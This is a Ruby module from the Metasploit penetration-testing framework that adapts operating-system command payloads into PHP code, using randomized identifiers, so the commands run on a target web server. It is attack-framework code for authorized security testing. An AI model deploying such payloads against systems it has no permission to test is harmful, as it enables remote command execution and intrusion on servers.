##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OS Command Exec',
        'Description' => 'Execute an OS command from PHP',
        'Author' => 'Spencer McIntyre',
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_CMD,
        'AdaptedPlatform' => 'unix'
      )
    )
  end

  def generate(_opts = {})
    payload = super

    vars = Rex::RandomIdentifier::Generator.new(language: :php)

    <<~TEXT
      #{Msf::Payload::Php.preamble(vars_generator: vars)}
      #{Msf::Payload::Php.system_block(vars_generator: vars, cmd: payload)}
      ?>
    TEXT
  end
end
